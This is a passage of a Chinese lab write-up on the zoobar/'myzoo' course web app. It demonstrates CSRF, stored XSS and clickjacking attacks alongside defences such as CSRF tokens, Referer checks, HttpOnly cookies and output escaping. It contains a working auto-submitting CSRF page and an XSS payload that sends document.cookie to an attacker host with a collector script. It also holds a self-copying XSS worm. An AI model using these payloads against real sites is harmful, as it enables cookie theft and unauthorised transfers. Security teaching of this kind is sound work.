<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>my profile<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;it&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span> <span class="attr">width</span>=<span class="string">&quot;600px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;450px&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">name</span>=<span class="string">&quot;transferform&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">action</span>=<span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">target</span>=<span class="string">&quot;it&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">id</span>=<span class="string">&quot;transferform&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;zoobars&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">size</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;recipient&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;csrfattack&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submission&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Send&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://106.13.136.87:8080/101.jpeg&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;transferform&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    form.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>myzoo网站所在虚拟机配置(10.211.55.14):</p>
<p>1.关闭防火墙</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw disable</span><br></pre></td></tr></table></figure>

<p>2.配置hosts</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line">在最后添加 </span><br><span class="line">127.0.0.1  www.myzoo.com</span><br><span class="line">10.211.55.16 www.attack.com #这里的ip填写攻击者服务器的ip地址</span><br></pre></td></tr></table></figure>

<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>1.在csrfattack账号的profile中写入：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.attack.com&quot;</span>&gt;</span> 点击查看我的照片哦<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后点击save。</p>
<p>2.在10.211.55.14上登录victim账户，victim用户去查看csrfattack的profile</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211234357.png" alt="截屏2021-01-05 上午4.06.02"></p>
<p>当victim点击该链接后，就会向csrfattack转1个zoobars。</p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h4 id="方法1-使用session"><a href="#方法1-使用session" class="headerlink" title="方法1:使用session"></a>方法1:使用session</h4><p>修改transfer.php文件：</p>
<p>1.在开头加入下面的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.修改if语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submission&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>3.在45-47行加入下面内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>4.在form中添加下面的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;input type=hidden name=token value=<span class="string">&quot;&lt;?php echo <span class="subst">$_SESSION</span>[&#x27;csrf&#x27;]?&gt;&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>修改后的transfer.php如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&quot;includes/common.php&quot;</span>); </span><br><span class="line">  <span class="title function_ invoke__">nav_start_outer</span>(<span class="string">&quot;Transfer&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">nav_start_inner</span>();</span><br><span class="line"> <span class="comment">//if($_POST[&#x27;submission&#x27;]) &#123;</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submission&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>]) &#123;</span><br><span class="line"> <span class="comment">//if($_POST[&#x27;submission&#x27;] &amp;&amp; $_SERVER[&#x27;HTTP_REFERER&#x27;] == &quot;http://www.myzoo.com/transfer.php&quot;) &#123;</span></span><br><span class="line">	    <span class="variable">$recipient</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;recipient&#x27;</span>];</span><br><span class="line">    <span class="variable">$zoobars</span> = (<span class="keyword">int</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;zoobars&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">    <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">    <span class="variable">$sender_balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>] - <span class="variable">$zoobars</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT PersonID FROM Person WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">    <span class="variable">$recipient_exists</span> = <span class="variable">$rs</span>[<span class="string">&quot;PersonID&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$zoobars</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$sender_balance</span> &gt;= <span class="number">0</span> &amp;&amp; <span class="variable">$recipient_exists</span>) &#123;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;UPDATE Person SET Zoobars = <span class="subst">$sender_balance</span> &quot;</span> .</span><br><span class="line">             <span class="string">&quot;WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">      <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">      <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">      <span class="variable">$recipient_balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>] + <span class="variable">$zoobars</span>;</span><br><span class="line">      <span class="variable">$sql</span> = <span class="string">&quot;UPDATE Person SET Zoobars = <span class="subst">$recipient_balance</span> &quot;</span> .</span><br><span class="line">             <span class="string">&quot;WHERE Username=&#x27;<span class="subst">$recipient</span>&#x27;&quot;</span>;</span><br><span class="line">      <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">      <span class="variable">$result</span> = <span class="string">&quot;Sent <span class="subst">$zoobars</span> zoobars&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="variable">$result</span> = <span class="string">&quot;Transfer to <span class="subst">$recipient</span> failed.&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;&lt;b&gt;Balance:&lt;/b&gt;</span><br><span class="line">&lt;span id=<span class="string">&quot;myZoobars&quot;</span>&gt;  <span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;SELECT Zoobars FROM Person WHERE PersonID=<span class="subst">$user</span>-&gt;id&quot;</span>;</span><br><span class="line">  <span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="variable">$sql</span>);</span><br><span class="line">  <span class="variable">$rs</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rs</span>);</span><br><span class="line">  <span class="variable">$balance</span> = <span class="variable">$rs</span>[<span class="string">&quot;Zoobars&quot;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$balance</span> &gt; <span class="number">0</span> ? <span class="variable">$balance</span> : <span class="number">0</span>;</span><br><span class="line"><span class="meta">?&gt;</span> &lt;/span&gt; zoobars&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf&#x27;</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(), <span class="literal">true</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form method=POST name=transferform</span><br><span class="line">  action=<span class="string">&quot;&lt;?php echo <span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;Send &lt;input name=zoobars type=text value=<span class="string">&quot;&lt;?php </span></span><br><span class="line"><span class="string">  echo <span class="subst">$_POST</span>[&#x27;zoobars&#x27;]; </span></span><br><span class="line"><span class="string">?&gt;&quot;</span> size=<span class="number">5</span>&gt; zoobars&lt;/p&gt;</span><br><span class="line">&lt;p&gt;to &lt;input name=recipient type=text value=<span class="string">&quot;&lt;?php </span></span><br><span class="line"><span class="string">  echo <span class="subst">$_POST</span>[&#x27;recipient&#x27;]; </span></span><br><span class="line"><span class="string">?&gt;&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">&lt;input type=hidden name=token value=<span class="string">&quot;&lt;?php echo <span class="subst">$_SESSION</span>[&#x27;csrf&#x27;]?&gt;&quot;</span>/&gt;</span><br><span class="line">&lt;input type=submit name=submission value=<span class="string">&quot;Send&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;span <span class="class"><span class="keyword">class</span>=<span class="title">warning</span>&gt;&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">  <span class="title">echo</span> &quot;$<span class="title">result</span>&quot;; </span></span><br><span class="line"><span class="class">?&gt;&lt;/<span class="title">span</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class">  <span class="title">nav_end_inner</span>();</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">type</span>=&quot;<span class="title">text</span>/<span class="title">javascript</span>&quot; <span class="title">src</span>=&quot;<span class="title">zoobars</span>.<span class="title">js</span>.<span class="title">php</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">  <span class="title">nav_end_outer</span>(); </span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方法2-验证HTTP-Referer"><a href="#方法2-验证HTTP-Referer" class="headerlink" title="方法2:验证HTTP Referer"></a>方法2:验证HTTP Referer</h4><p>修改transfer.php文件：</p>
<p>1.修改if语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submission&#x27;</span>] &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] == <span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>在zoobar网站上展示并防御XSS攻击。请注意实现cookie窃取、以及xss蠕虫。</p>
<p>如果不修改myzoo&#x2F;user.php源码，很难实现XSS攻击</p>
<p>修改 myzoo&#x2F;user.php源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$allowed_tags</span> = </span><br><span class="line">      <span class="string">&#x27;&lt;script&gt;&lt;a&gt;&lt;br&gt;&lt;b&gt;&lt;h1&gt;&lt;h2&gt;&lt;h3&gt;&lt;h4&gt;&lt;i&gt;&lt;img&gt;&lt;li&gt;&lt;ol&gt;&lt;p&gt;&lt;strong&gt;&lt;table&gt;&#x27;</span> .</span><br><span class="line">      <span class="string">&#x27;&lt;tr&gt;&lt;td&gt;&lt;th&gt;&lt;u&gt;&lt;ul&gt;&lt;em&gt;&lt;span&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$disallowed</span> = </span><br><span class="line">  <span class="string">&#x27;eval|setTimeout|setInterval|target|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onAbort|onBlur|onChange|onClick|onDblClick|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onDragDrop|onFocus|onKeyDown|onKeyPress|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onKeyUp|onLoad|onMouseDown|onMouseMove|onMouseOut|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onMouseOver|onMouseUp|onMove|onReset|onResize|&#x27;</span>.</span><br><span class="line">  <span class="string">&#x27;onSelect|onSubmit|onUnload&#x27;</span>;</span><br></pre></td></tr></table></figure>



<h3 id="cookie窃取"><a href="#cookie窃取" class="headerlink" title="cookie窃取"></a>cookie窃取</h3><h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>在myzoo网站创建账号xssattack。</p>
<p>攻击者虚拟机配置（10.211.55.16）</p>
<p>1.创建xss.php文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /var/www/html/xss.php</span><br></pre></td></tr></table></figure>

<p>将下面的内容复制进去</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cookie</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;get cookie: &#x27;</span>.<span class="variable">$cookie</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;not get cookie&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h4><p>修改xssattack账号的profile</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">src</span>=x onerror=javascript:window.<span class="built_in">open</span>(<span class="string">&quot;http://www.attack.com/xss.php?cookie=&quot;</span>+document.cookie) /&gt;</span><br></pre></td></tr></table></figure>

<p>用户victim访问xssattack，就会弹出一个页面里面会打印获取到的cookie值。</p>
<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><h5 id="方法一-设置httponly"><a href="#方法一-设置httponly" class="headerlink" title="方法一:设置httponly"></a>方法一:设置httponly</h5><p>如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击，窃取cookie内容，这样就增加了cookie的安全性。</p>
<p>1.修改auth.php文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// setcookie($this-&gt;cookieName, $cookieData, time() + 31104000);</span></span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="variable">$this</span>-&gt;cookieName, <span class="variable">$cookieData</span>, <span class="title function_ invoke__">time</span>() + <span class="number">31104000</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<h5 id="方法二-禁用标签"><a href="#方法二-禁用标签" class="headerlink" title="方法二:禁用标签"></a>方法二:禁用标签</h5><h3 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h3><h4 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h4><p>进行这个攻击前需要把csrf的的防御给去掉。</p>
<p>注册账号xssattack1</p>
<p>修改xssattack1的profile</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;hack&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span>,<span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">send</span>(<span class="string">&quot;zoobars=1&amp;recipient=xssattack1&amp;submission=Send&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        xmlhttp=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;http://www.myzoo.com/index.php&quot;</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        str = <span class="string">&quot;&lt;span id=hack&gt;&quot;</span></span></span><br><span class="line"><span class="language-javascript">        str += <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;hack&quot;</span>).<span class="property">innerHTML</span> + <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        str = <span class="built_in">encodeURIComponent</span>(str);</span></span><br><span class="line"><span class="language-javascript">        str = <span class="string">&quot;profile_submit=Save&amp;profile_update=&quot;</span> + str;</span></span><br><span class="line"><span class="language-javascript">        xmlhttp.<span class="title function_">send</span>(str);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当其他用户访问xssattack1时，就会给xssattack1转1个zoobars，并且复制xssattack1的profile复制到自己的profile。</p>
<h4 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h4><h5 id="方法1-输入过滤"><a href="#方法1-输入过滤" class="headerlink" title="方法1:输入过滤"></a>方法1:输入过滤</h5><p>输入过滤比较好理解，可以通过设置白名单或者黑名单，将一些可能造成攻击的标签都过滤；</p>
<h5 id="方法2-输出转义"><a href="#方法2-输出转义" class="headerlink" title="方法2:输出转义"></a>方法2:输出转义</h5><p>输出转义，主要是因为输入的恶意代码，如果保存在网站的数据库中，最终都是有一个输出的过程然后才能获得执行。那么就在从数据库取出，并展示在网页之前，对所有的内容进行转义。PHP中htmlentities() 函数把字符转换为 HTML 实体。HTML实体（character entities）的目的是正确地显示预留字符，譬如如果想要在网页上输出&lt;br&gt;，如果直接在HTML中写&lt;br&gt;，浏览器会自动将它当做代码，而不是字符串，此时就需要，将&lt;和&gt;转换为实体，也即&amp;lt; 或 &amp;#60。也即，通过htmlentities，所有的攻击代码，不管怎么构造的，都会被变成普通的字符，而不会造成攻击效果。</p>
<p>修改users.php文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$profile</span>, <span class="variable">$allowed_tags</span>);</span><br><span class="line"><span class="variable">$profile</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$profile</span>); <span class="comment">//在users.php中加入这行代码即可</span></span><br></pre></td></tr></table></figure>

<h2 id="Click-Jacking"><a href="#Click-Jacking" class="headerlink" title="Click Jacking"></a>Click Jacking</h2><p>在zoobar网站上展示并防御点击劫持攻击；或者在其他网站上实现点击劫持攻击。</p>
<p>结合csrf的clickjacking版本</p>
<h3 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h3><p>在myzoo网站上注册clickjacking账号</p>
<p>攻击者虚拟机配置(10.211.55.16)</p>
<p>1.创建clickjacking.html</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /var/www/html/clickjacking.html</span><br></pre></td></tr></table></figure>

<p>将以下内容复制进去</p>
<p>Clickjacking.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">iframe</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">1440px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">900px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: -<span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: -<span class="number">0px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">2</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">opacity</span>: <span class="number">0.5</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#clickjacking</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: <span class="number">294px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">584px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;it&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span> <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">name</span>=<span class="string">&quot;transferform&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">action</span>=<span class="string">&quot;http://www.myzoo.com/transfer.php&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">target</span>=<span class="string">&quot;it&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">id</span>=<span class="string">&quot;transferform&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;zoobars&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">size</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;recipient&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;clickjacking&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submission&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Send&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;clickjacking&quot;</span> <span class="attr">value</span>=<span class="string">&quot;WIN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span 